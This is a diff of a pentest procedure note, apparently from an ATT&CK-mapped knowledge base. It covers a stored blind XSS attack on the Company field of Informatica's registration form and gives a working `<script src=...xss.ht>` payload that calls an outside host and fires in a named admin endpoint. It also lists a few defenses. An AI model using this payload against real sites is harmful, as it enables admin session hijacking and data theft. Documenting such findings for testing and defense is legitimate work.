@@ -2,10 +2,9 @@
 tags:
   - xss-injection
   - payload
-  - execution
 type: procedure
 tools:
-  - '[[tools/XSS-Hunter]]'
+  - '[[tools/xsshunter]]'
 tactics:
   - '[[Execution]]'
 commands: []
@@ -16,9 +15,9 @@ submitted: true
 created_at: '2023-10-01T00:00:00Z'
 techniques:
   - '[[JavaScript]]'
-updated_at: '2025-12-14T03:46:38.175Z'
+updated_at: '2025-12-14T17:29:20.218Z'
 sub_techniques: []
-id: 113aea4e-7e1d-43e0-9506-d4ee0daf9d61
+id: c3710ad1-7563-486f-a49c-72e4a5aa2138
 validated: true
 mitre_tactics:
   - '[[Execution]]'
@@ -29,49 +28,49 @@ mitre_techniques:
 
 ## Summary
 
-This procedure injects a blind XSS payload into the Company field during Informatica account registration or profile update, exploiting lack of HTML sanitization to store executable JavaScript that activates upon admin review.
+This procedure injects a blind XSS payload into the unsanitized Company field during registration, leveraging improper HTML sanitization to store executable JavaScript for later admin-side execution.
 
 ## Description
 
-The Company field accepts user input without proper escaping, allowing closure of HTML tags and script insertion. The payload `<script src=https://monty.xss.ht></script>` is blind, meaning it doesn't execute immediately but persists in the database and fires when rendered in the admin panel at endpoints like /phnx/driver.aspx?routename=Social/UniversalProfile/UserRecordEdit. This leads to JavaScript execution in the admin's session, enabling data theft. Prerequisites include an active registration session.
+Targeted at web applications like Informatica's account system, this step exploits the lack of input validation in the Company field. The payload `"><script src=https://monty.xss.ht></script>` closes HTML tags and loads an external script from an XSS monitoring service. It requires prior access to the registration form and a configured hunter URL. Outcomes include payload persistence in the user record, triggering upon admin view for data exfiltration.
 
 ## Requirements
 
-1. Access to the registration or profile edit form
-2. Generated XSS Hunter payload URL
-3. Basic knowledge of XSS payloads
+1. Active session on the registration form
+2. Configured XSS Hunter account with a unique domain like monty.xss.ht
+3. Knowledge of HTML/JS payload crafting
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Sanitize all user inputs with HTML entity encoding
-- Use Content Security Policy (CSP) to block external scripts
-- Audit admin panel rendering for unsanitized data
+- Sanitize all user inputs with HTML entity encoding or libraries like DOMPurify
+- Implement Content Security Policy (CSP) to block external script sources
+- Log and alert on suspicious input patterns in form submissions
 
 ## Objectives
 
-1. Store malicious script without detection
-2. Ensure payload targets admin context
-3. Prepare for exfiltration upon trigger
+1. Embed malicious JavaScript in stored data
+2. Ensure blind execution without immediate feedback
+3. Target admin context for privilege escalation
 
 ## Instructions
 
 ### Step 1: Prepare Payload
 
-**Context**: Generate or use a pre-built blind XSS payload from a monitoring service.
+**Context**: Generate or customize the blind XSS payload using the monitoring service.
 
-No command required; copy `<script src=https://monty.xss.ht></script>` (replace with your XSS Hunter URL).
+**Instructions**: Log into xsshunter.com, create a new hunt, and obtain the script source URL (e.g., https://monty.xss.ht). Construct the payload as `"><script src=https://monty.xss.ht></script>`.
 
-> This payload loads an external script that beacons back to the attacker.
+> Manual preparation. Expected output: Valid payload string ready for injection.
 
-### Step 2: Enter Payload in Form
+### Step 2: Insert Payload in Form
 
-**Context**: Insert the payload into the vulnerable field during submission.
+**Context**: Place the payload in the vulnerable Company field to bypass sanitization.
 
-No command required; paste into Company field and submit the form.
+**Instructions**: In the Company input, paste the full payload. Ensure no additional quotes or tags interfere.
 
-> Expected output: Form acceptance without errors; payload stored in user record.
+> Form input action. Expected output: Field accepts the payload without truncation or errors.
 
 ## MITRE ATT&CK Mapping
 
@@ -91,7 +90,7 @@ No command required; paste into Company field and submit the form.
 
 ## Tools Used
 
-- [[tools/XSS-Hunter]]
+- [[tools/xsshunter]]
 
 ## Tags
 
